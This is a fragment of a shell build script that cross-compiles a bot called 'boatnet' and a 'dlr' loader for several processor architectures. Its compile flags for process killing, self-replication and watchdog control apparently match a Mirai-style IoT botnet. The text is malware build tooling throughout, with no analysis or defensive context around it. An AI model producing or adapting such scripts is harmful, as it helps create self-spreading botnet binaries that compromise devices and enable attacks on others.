...
echo "Building - i486"
compile_bot i486 boatnet.i486 "-static -DKILLER -DSELFREP -DWATCHDOG"
echo "Building - i686"
compile_bot i686 boatnet.i686 "-static -DKILLER -DSELFREP -DWATCHDOG"
echo "Building - mips"
...
compile_bot x86_64 boatnet.x86_64 "-static -DKILLER -DSELFREP -DWATCHDOG"
echo "Building - arc"
...
i486-gcc -Os -D BOT_ARCH=\"x86\" -D X32 -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.i486
i686-gcc -Os -D BOT_ARCH=\"x86\" -D X32 -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.i686
